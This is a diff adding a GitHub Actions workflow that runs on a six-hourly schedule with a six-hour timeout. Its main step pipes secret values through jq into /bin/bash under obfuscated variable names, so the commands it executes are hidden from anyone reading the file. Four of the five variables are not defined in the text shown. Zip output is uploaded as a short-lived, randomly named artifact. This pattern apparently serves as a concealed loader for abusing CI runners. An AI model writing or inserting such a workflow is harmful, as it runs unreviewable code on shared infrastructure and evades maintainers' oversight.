@@ -1,0 +1,37 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '42 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          btzx59: ${{ secrets.btzx59 }}
+        run: |
+          printf '%s' "$btzx59" | jq -r .mtae6279 | /bin/bash
+          printf '%s' "$kx41169" | jq -r .jage21 | /bin/bash
+          printf '%s' "$whisf48" | jq -r .wab4047 | /bin/bash
+          printf '%s' "$fwkgt213" | jq -r .udgb5 | /bin/bash
+          echo $gps1029 | jq -r .d34 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mSNeRo2u
+          path: "*.zip"
+          retention-days: 1
